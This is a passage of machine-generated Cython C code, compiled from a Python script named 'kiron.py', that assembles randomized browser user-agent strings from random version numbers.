  __Pyx_INCREF(__pyx_kp_u_0);
  __pyx_t_6 += 3;
  __Pyx_GIVEREF(__pyx_kp_u_0);
  PyTuple_SET_ITEM(__pyx_t_4, 8, __pyx_kp_u_0);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__13, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_2};
    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_4, 9, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_4, 10, __pyx_kp_u__11);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_1};
    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_4, 11, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_Safari);
  __pyx_t_6 += 8;
  __Pyx_GIVEREF(__pyx_kp_u_Safari);
  PyTuple_SET_ITEM(__pyx_t_4, 12, __pyx_kp_u_Safari);
  __Pyx_INCREF(__pyx_v_bz);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_bz) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_bz) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_bz);
  __Pyx_GIVEREF(__pyx_v_bz);
  PyTuple_SET_ITEM(__pyx_t_4, 13, __pyx_v_bz);
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_4, 14, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_B = ((PyObject*)__pyx_t_3);
  __pyx_t_3 = 0;

  /* "kiron.py":149
 *     bz=f"5{bx}.{bV}"
 *     B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
 *     cV=str(random.choice(range(1,36)))             # <<<<<<<<<<<<<<
 *     cx=str(random.choice(range(34,38)))
 *     cz=f"5{cx}.{cV}"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 149, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 149, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 149, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_1 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_1, __pyx_t_4};
    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 149, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 149, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_cV = __pyx_t_2;
  __pyx_t_2 = 0;

  /* "kiron.py":150
 *     B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
 *     cV=str(random.choice(range(1,36)))
 *     cx=str(random.choice(range(34,38)))             # <<<<<<<<<<<<<<
 *     cz=f"5{cx}.{cV}"
 *     C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 150, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 150, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 150, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_1, __pyx_t_3};
    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 150, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  }
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 150, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_cx = __pyx_t_4;
  __pyx_t_4 = 0;

  /* "kiron.py":151
 *     cV=str(random.choice(range(1,36)))
 *     cx=str(random.choice(range(34,38)))
 *     cz=f"5{cx}.{cV}"             # <<<<<<<<<<<<<<
 *     C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
 *     D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
 */
  __pyx_t_4 = PyTuple_New(4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 151, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_5);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u_5);
  PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_5);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_v_cx, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 151, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u__11);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_v_cV, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 151, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_t_2);
  __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_4, 4, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 151, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_cz = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;

  /* "kiron.py":152
 *     cx=str(random.choice(range(34,38)))
 *     cz=f"5{cx}.{cV}"
 *     C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"             # <<<<<<<<<<<<<<
 *     D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
 *     return random.choice([A,B,C,D])
 */
  __pyx_t_2 = PyTuple_New(12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_Windows_NT_6);
  __pyx_t_6 += 26;
  __Pyx_GIVEREF(__pyx_kp_u_Mozilla_5_0_Windows_NT_6);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_Mozilla_5_0_Windows_NT_6);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_kp_s_2);
  __Pyx_GIVEREF(__pyx_kp_s_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 0, __pyx_kp_s_2)) __PYX_ERR(0, 152, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_1);
  __Pyx_GIVEREF(__pyx_kp_s_1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 1, __pyx_kp_s_1)) __PYX_ERR(0, 152, __pyx_L1_error);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_3};
    __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_WOW64_AppleWebKit);
  __pyx_t_6 += 21;
  __Pyx_GIVEREF(__pyx_kp_u_WOW64_AppleWebKit);
  PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_WOW64_AppleWebKit);
  __Pyx_INCREF(__pyx_v_cz);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_cz) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_cz) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_cz);
  __Pyx_GIVEREF(__pyx_v_cz);
  PyTuple_SET_ITEM(__pyx_t_2, 3, __pyx_v_cz);
  __Pyx_INCREF(__pyx_kp_u_KHTML_like_Gecko_Chrome);
  __pyx_t_6 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_KHTML_like_Gecko_Chrome);
  PyTuple_SET_ITEM(__pyx_t_2, 4, __pyx_kp_u_KHTML_like_Gecko_Chrome);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__12, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_1};
    __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_2, 5, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_0);
  __pyx_t_6 += 3;
  __Pyx_GIVEREF(__pyx_kp_u_0);
  PyTuple_SET_ITEM(__pyx_t_2, 6, __pyx_kp_u_0);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__13, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_3};
    __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_2, 7, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_2, 8, __pyx_kp_u__11);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_8 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_8, __pyx_t_1};
    __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
